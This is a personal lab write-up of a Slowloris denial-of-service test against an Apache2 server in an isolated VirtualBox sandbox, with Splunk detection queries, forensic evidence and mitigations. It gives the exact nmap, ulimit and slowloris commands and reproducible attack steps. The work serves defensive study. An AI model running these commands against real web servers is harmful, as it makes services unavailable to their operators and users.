# Slowloris Application-Layer DoS — Targeted Research (Lab)

**Project type:** Targeted Research / Exploit (sandbox only)  
**Role:** Attacker (I executed and documented the attack)  
**Author:** I did this (Vansh Bhardwaj)  
**Date:** December 2, 2025

---

## High-level summary
I executed an application-layer Denial-of-Service (DoS) against an Apache2 web server inside an isolated VirtualBox sandbox using the classic Slowloris technique. I configured Splunk to ingest the Apache `access.log` and `error.log`, tuned the attacking VM to allow many sockets, launched Slowloris from Kali, and validated the attack using Splunk, Wireshark, host-level tooling, and direct HTTP tests. This repo contains the evidence, exact commands, detection queries, and recommended mitigations.

---

## Skills demonstrated
- Application-layer DoS emulation (Slowloris)  
- VirtualBox sandbox and pfSense topology management  
- SIEM ingestion and monitoring (Splunk)  
- Reconnaissance with `nmap`  
- Network forensics (tcpdump / Wireshark)  
- Host forensics (`ss` / `netstat`, Apache logs)  
- Reproducible documentation and defensive recommendations

---

## Why this matters
Slowloris-style attacks can render web services unavailable while using very little bandwidth. Demonstrating both attack execution and detection in Splunk shows I can reason about attack techniques and operationalize detection/response — a key skill for SOC analysts, security engineers, and GRC practitioners.

---

## Lab environment & brief topology
I built an isolated sandbox in VirtualBox and used pfSense as the firewall/router between two /24 subnets.

**Network A (internal)** — `192.168.1.0/24`  
- Ubuntu (Victim / Apache2): **`192.168.1.10`**  
- Windows XP (Workstation): `192.168.1.20`

**Network B (attacker / external)** — `192.168.2.0/24`  
- Kali Linux (Attacker): **`192.168.2.10`**

**Router / Firewall**: pfSense (LAN <-> Network A, OPT1/WAN <-> Network B)  
**Monitoring**: Splunk (configured to ingest `/var/log/apache2/access.log` and `/var/log/apache2/error.log`)

_Place topology screenshot here (VirtualBox VM list or diagram):_  
![Topology]([assets/screenshots/01-topology.png](https://github.com/VanshBhardwaj1945/slowloris-dos-attack-lab-/blob/cf5fccc1b5b7a5bbd10ab70b4e12ae4c1638c9c6/assets/Topology.png))

---

## Splunk: what I configured & how I validated ingestion
I configured Splunk to ingest the two Apache log files from the victim VM:

- `/var/log/apache2/access.log` (sourcetype: `apache:access`)  
- `/var/log/apache2/error.log` (sourcetype: `apache:error`)

Add Splunk screenshots to show ingestion:

# Reconnaissance — exact commands I used
From the attacker (Kali):

bash
Copy code
# Quick port/service scan
nmap -sS -T4 -F 192.168.1.10

# Confirm HTTP service
curl -I http://192.168.1.10/
Add nmap screenshot here:

Pre-attack tuning (what I changed on Kali)
Slowloris uses lots of sockets; I increased file-descriptor limits on Kali before running:

bash
Copy code
# temporary increase for the shell
ulimit -n 65536

# optional: make system-wide via sysctl (example)
echo "fs.file-max = 100000" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
Confirm new limit:

bash
Copy code
ulimit -n
Attack execution — exact command I used
Command I ran from Kali (attacker):

bash
Copy code
# run tcpdump (optional capture)
sudo tcpdump -i eth0 port 80 -w /tmp/slowloris_attacker.pcap &

# execute slowloris
slowloris -v -p 80 -s 1500 --sleeptime 10 192.168.1.10
-v = verbose

-p 80 = HTTP port

-s 1500 = socket count (tuned to VM limits)

--sleeptime 10 = seconds between header refreshes

How I verified this was Slowloris (evidence & indicators)
I confirmed the attack type by correlating five independent indicators (these are exactly the things I used):

A. Apache error.log evidence

Splunk showed MaxRequestWorkers reached and similar exhaustion errors while the attack was running. (See 06-apache-errorlog-snippet.txt and 04-splunk-maxrequestworkers.png.)

B. Apache access.log patterns

Access log showed many long-running, partial requests and HTTP 408/timeouts during the attack. (See 07-accesslog-408s.png.)

C. Host socket table (ss/netstat)

ss -antp | grep :80 returned hundreds of connections in ESTABLISHED (long-lived) state from the attacker IP. (Saved as 05-ss-output.txt.)

D. Wireshark network evidence

Packet capture showed many HTTP connections with incomplete headers and very slow header refresh behavior from the same source IP — classic Slowloris traffic. (See 03-wireshark-partial-headers.png.)

E. Application-level availability effect

curl from another terminal timed out or stalled while ICMP (ping) still worked — indicating application-layer (HTTP) exhaustion rather than network down. I verified this in real-time while monitoring Splunk.

Because all five indicators aligned (error logs, access logs, socket table, packet-level partial header behavior, and application-level failure), I concluded the observed behavior was Slowloris.

Evidence (place these exact files in assets/screenshots/)
01-topology.png — topology / VirtualBox screenshot

02-nmap-before.png — nmap output showing port 80 open

03-wireshark-partial-headers.png — wireshark screenshot showing partial/incomplete HTTP headers

04-splunk-maxrequestworkers.png — Splunk screenshot showing MaxRequestWorkers or worker exhaustion

05-ss-output.txt — ss -antp | grep :80 output saved to text file

06-apache-errorlog-snippet.txt — relevant Apache error.log lines

07-accesslog-408s.png — Splunk or screenshot of access log 408/timeouts

08-tcpdump-attacker.pcap — optional attacker pcap (downloadable)

Embed examples below (these lines render the images / text in the README when files exist):





05-ss-output.txt and 06-apache-errorlog-snippet.txt will render as text files when uploaded.

Splunk detection queries I used (copyable)
text
Copy code
# Find MaxRequestWorkers / Apache exhaustion errors
index=main sourcetype=apache:error "MaxRequestWorkers" OR "server reached MaxRequestWorkers"

# Show long-duration requests (example)
index=main sourcetype=apache:access | eval duration=_time - _indextime | where duration > 60

# Count connections per IP from access logs
index=main sourcetype=apache:access | stats count by clientip | sort -count
Set up an alert on the first query to trigger a notification or automated pfSense block.

Analysis — why the attack worked
Slowloris holds partial HTTP connections open and refreshes headers slowly. Apache worker threads/processes remain occupied waiting for the request to complete, so when MaxRequestWorkers is reached, new legitimate requests get blocked or stall. Key factors I observed:

Low default Apache worker settings relative to attack socket count

Keep-alive / header timeouts allowing connections to remain open

Attacker's increased ulimit -n enabling hundreds/thousands of sockets

Defenses & recommendations
Server-level

Enable and tune mod_reqtimeout to limit header/body read times

Reduce KeepAliveTimeout and tune MaxRequestWorkers

Use mod_evasive to mitigate abusive clients

Network/Architectural

Place a reverse proxy (Nginx/HAProxy) or CDN in front of Apache

Use a WAF that detects slow HTTP patterns

Rate-limit per IP on pfSense (or cloud layer)

Operational

Create Splunk alerts for MaxRequestWorkers and sudden spikes of long-lived requests

Automate temporary IP blocking in pfSense when thresholds are exceeded

Reproducible steps (short)
Restore clean snapshots for victim and attacker VMs.

Confirm Apache is running and Splunk is ingesting logs:

bash
Copy code
sudo systemctl status apache2
curl -I http://192.168.1.10/
On Kali, set ulimit -n 65536.

Start tcpdump (optional): sudo tcpdump -i eth0 port 80 -w /tmp/slowloris_attacker.pcap &

Run Slowloris:

bash
Copy code
slowloris -v -p 80 -s 1500 --sleeptime 10 192.168.1.10
Observe Splunk, ss, Apache logs, and Wireshark for the evidence described above.

Stop attack and restore snapshots.

Ethical notice & scope
All testing was performed inside an authorized, isolated lab environment. This documentation is for defensive education only. Do not run these steps against systems you do not own or are not authorized to test.

